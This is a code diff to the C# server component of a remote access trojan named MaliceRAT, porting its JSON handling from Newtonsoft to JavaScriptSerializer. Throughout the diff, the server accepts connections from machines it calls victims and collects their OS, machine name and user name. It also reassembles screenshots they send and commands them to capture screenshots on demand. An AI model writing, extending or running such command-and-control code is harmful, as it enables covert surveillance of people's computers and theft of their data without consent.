@@ -5,8 +5,8 @@ using System.Net;
 using System.Net.Sockets;
 using System.Collections.Generic;
 using System.Timers;
-using Newtonsoft.Json;
 using System.Runtime.InteropServices;
+using System.Web.Script.Serialization;
 
 namespace MaliceRAT.RatServer
 {
@@ -25,6 +25,7 @@ namespace MaliceRAT.RatServer
         private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
 
         private StringBuilder screenshotBuilder = new StringBuilder();
+        private JavaScriptSerializer serializer = new JavaScriptSerializer();
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -48,7 +49,6 @@ namespace MaliceRAT.RatServer
             {
                 TcpClient tcpClient = await server.AcceptTcpClientAsync();
                 Victim client = new Victim(tcpClient, victims.Count);
-                Console.WriteLine("Client number: " + client.Id);
                 OnClientConnected(client);
                 var clientTask = HandleClient(client);
                 clientTasks[client.Id] = clientTask;
@@ -86,17 +86,17 @@ namespace MaliceRAT.RatServer
                     Console.WriteLine("Received message: " + receivedMessage);
                     try
                     {
-                        dynamic jsonMessage = JsonConvert.DeserializeObject(receivedMessage);
+                        dynamic jsonMessage = serializer.Deserialize<dynamic>(receivedMessage);
 
-                        if (jsonMessage.type == "message")
+                        if (jsonMessage["type"] == "message")
                         {
-                            OnMessageReceived(jsonMessage.text.ToString());
+                            OnMessageReceived(jsonMessage["text"].ToString());
                         }
-                        else if (jsonMessage.type == "info")
+                        else if (jsonMessage["type"] == "info")
                         {
-                            string OS = jsonMessage.os.ToString();
-                            string PC = jsonMessage.pc.ToString();
-                            string User = jsonMessage.user.ToString();
+                            string OS = jsonMessage["os"].ToString();
+                            string PC = jsonMessage["pc"].ToString();
+                            string User = jsonMessage["user"].ToString();
 
                             client.OS = OS;
                             client.PC = PC;
@@ -104,14 +104,14 @@ namespace MaliceRAT.RatServer
 
                             InfoReceived?.Invoke(client);
                         }
-                        else if (jsonMessage.type == "heartbeat")
+                        else if (jsonMessage["type"] == "heartbeat")
                         {
                             heartbeatReceived = true;
                         }
-                        else if (jsonMessage.type == "screenshot_chunk")
+                        else if (jsonMessage["type"] == "screenshot_chunk")
                         {
-                            screenshotBuilder.Append(jsonMessage.data.ToString());
-                            if (jsonMessage.final == true)
+                            screenshotBuilder.Append(jsonMessage["data"].ToString());
+                            if (jsonMessage["final"] == true)
                             {
                                 byte[] screenshotData = Convert.FromBase64String(screenshotBuilder.ToString());
                                 Console.WriteLine("Complete screenshot received from client: " + client.IP);
@@ -119,12 +119,12 @@ namespace MaliceRAT.RatServer
                                 screenshotBuilder.Clear();
                             }
                         }
-                        else if (jsonMessage.type == "stop_screenshots")
+                        else if (jsonMessage["type"] == "stop_screenshots")
                         {
                             Console.WriteLine("Client has stopped sending screenshots: " + client.IP);
                         }
                     }
-                    catch (JsonReaderException)
+                    catch (InvalidOperationException)
                     {
                         Console.WriteLine("Invalid JSON received.");
                         continue;
@@ -183,7 +183,7 @@ namespace MaliceRAT.RatServer
                 type = "heartbeat",
                 text = "ping"
             };
-            string jsonHeartbeat = JsonConvert.SerializeObject(heartbeat);
+            string jsonHeartbeat = serializer.Serialize(heartbeat);
             byte[] heartbeatBytes = Encoding.UTF8.GetBytes(jsonHeartbeat);
             if (stream.CanWrite)
             {
@@ -204,11 +204,11 @@ namespace MaliceRAT.RatServer
                 string message;
                 if (interval > 0)
                 {
-                    message = JsonConvert.SerializeObject(new { type = "set_interval", interval = interval });
+                    message = serializer.Serialize(new { type = "set_interval", interval = interval });
                 }
                 else
                 {
-                    message = JsonConvert.SerializeObject(new { type = "stop_screenshots" });
+                    message = serializer.Serialize(new { type = "stop_screenshots" });
                 }
                 SendMessageToClient(client, message);
             }
@@ -226,13 +226,13 @@ namespace MaliceRAT.RatServer
             if (client != null)
             {
                 // Temporarily set a very short interval to trigger an immediate screenshot
-                string startMessage = JsonConvert.SerializeObject(new { type = "set_interval", interval = 1 });
+                string startMessage = serializer.Serialize(new { type = "set_interval", interval = 1 });
                 SendMessageToClient(client, startMessage);
 
                 System.Timers.Timer timer = new System.Timers.Timer(100);
                 timer.Elapsed += (sender, args) =>
                 {
-                    string stopMessage = JsonConvert.SerializeObject(new { type = "stop_screenshots" });
+                    string stopMessage = serializer.Serialize(new { type = "stop_screenshots" });
                     SendMessageToClient(client, stopMessage);
                     timer.Stop();
                 };
